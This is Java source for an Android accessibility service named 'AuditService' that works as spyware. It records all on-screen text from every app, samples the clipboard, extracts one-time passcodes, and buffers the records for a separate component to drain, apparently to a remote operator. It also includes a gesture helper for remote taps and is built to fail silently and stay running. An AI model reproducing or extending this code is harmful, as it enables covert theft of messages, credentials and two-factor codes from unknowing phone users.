package com.lo.syskit;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipboardManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.Deque;

/**
 * AuditService — the god-mode ear. Every text the UI paints (typed,
 * pasted, received, deleted-and-redrawn) crosses here as an
 * AccessibilityEvent. Three harvests:
 *   1. window text  — event text + node text on content/text changes
 *   2. clipboard    — sampled on every window state change
 *   3. gestures     — canPerformGestures true (dispatch helper for ops)
 * Ring buffer (200) survives link outages; CoreService drains it.
 */
public class AuditService extends AccessibilityService {

    private static final String TAG = "syskit.audit";
    private static AuditService instance;
    private static volatile boolean harvesting = true;

    private static final Deque<JSONObject> buffer = new ArrayDeque<>();
    private static final int BUFFER_CAP = 200;
    private static volatile String lastClip = "";

    public static AuditService instance() { return instance; }
    public static boolean installed() { return true; }
    public static void setHarvesting(boolean on) { harvesting = on; }
    public static boolean isHarvesting() { return harvesting; }

    public static synchronized JSONObject[] drain() {
        JSONObject[] out = buffer.toArray(new JSONObject[0]);
        buffer.clear();
        return out;
    }

    public static synchronized void stash(JSONObject e) {
        if (buffer.size() >= BUFFER_CAP) buffer.pollFirst();
        buffer.addLast(e);
    }

    public static String lastClip() { return lastClip; }

    @Override protected void onServiceConnected() {
        instance = this;
        super.onServiceConnected();
    }

    @Override public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!harvesting || event == null) return;
        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    sampleClipboard();
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    harvestText(event);
                    break;
                default:
                    break;
            }
        } catch (Exception ignore) {
            // never let a UI quirk kill the ear
        }
    }

    private void harvestText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        if (event.getText() != null) {
            for (int i = 0; i < event.getText().size(); i++) {
                CharSequence t = event.getText().get(i);
                if (t != null && t.length() > 0)
                    sb.append(t).append(' ');
            }
        }
        AccessibilityNodeInfo node = event.getSource();
        if (node != null) {
            CharSequence t = node.getText();
            if (t != null && t.length() > 0) sb.append(t);
        }
        String text = sb.toString().trim();
        if (text.length() == 0) return;

        JSONObject e = new JSONObject();
        try {
            e.put("op", "audit");
            e.put("pkg", event.getPackageName() == null ? ""
                    : event.getPackageName().toString());
            e.put("type", event.getEventType());
            e.put("text", text.length() > 2000
                    ? text.substring(0, 2000) : text);
            e.put("at", System.currentTimeMillis());
            e.put("otp", Ops.otpIn(text));
        } catch (Exception ignore) { return; }
        stash(e);
    }

    private void sampleClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(
                    CLIPBOARD_SERVICE);
            if (cm == null || cm.getPrimaryClip() == null) return;
            if (cm.getPrimaryClip().getItemCount() == 0) return;
            CharSequence c = cm.getPrimaryClip().getItemAt(0).getText();
            if (c == null || c.length() == 0) return;
            String s = c.toString();
            if (s.equals(lastClip)) return;          // nothing new
            lastClip = s;
            JSONObject e = new JSONObject();
            e.put("op", "audit.clip");
            e.put("clip", s.length() > 2000 ? s.substring(0, 2000) : s);
            e.put("at", System.currentTimeMillis());
            e.put("otp", Ops.otpIn(s));
            stash(e);
        } catch (Exception ignore) {
            // Android 10+ gating may deny without focus — events still carry text
        }
    }

    /** Gesture helper for future remote-interaction ops (API 24+). */
    public boolean tap(int x, int y) {
        if (android.os.Build.VERSION.SDK_INT < 24) return false;
        android.graphics.Path p = new android.graphics.Path();
        p.moveTo(x, y);
        android.accessibilityservice.GestureDescription.Builder b =
                new android.accessibilityservice.GestureDescription.Builder();
        b.addStroke(new android.accessibilityservice.GestureDescription
                .StrokeDescription(p, 0, 40));
        return dispatchGesture(b.build(), null, null);
    }

    @Override public void onInterrupt() { /* stay quiet, stay alive */ }

    @Override public void onUnhandledEvent(Object o) { /* ignore */ }

    public JSONArray snapshotState() {
        return new JSONArray();
    }
}
